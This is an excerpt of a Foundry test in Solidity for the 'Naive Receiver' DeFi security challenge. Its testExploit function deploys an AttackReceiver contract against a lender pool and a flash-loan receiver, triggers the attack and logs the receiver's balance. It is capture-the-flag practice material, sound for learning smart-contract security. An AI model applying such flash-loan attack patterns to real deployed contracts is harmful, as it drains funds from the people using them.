...
import {AttackReceiver} from "../../../src/Contracts/naive-receiver/AttackReceiver.sol";
...
contract NaiveReceiver is Test {
    ...
    function testExploit() public {
        ...
        AttackReceiver attackContract = new AttackReceiver(address(naiveReceiverLenderPool), address(flashLoanReceiver));
        attackContract.attack();
        console2.log(address(flashLoanReceiver).balance);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
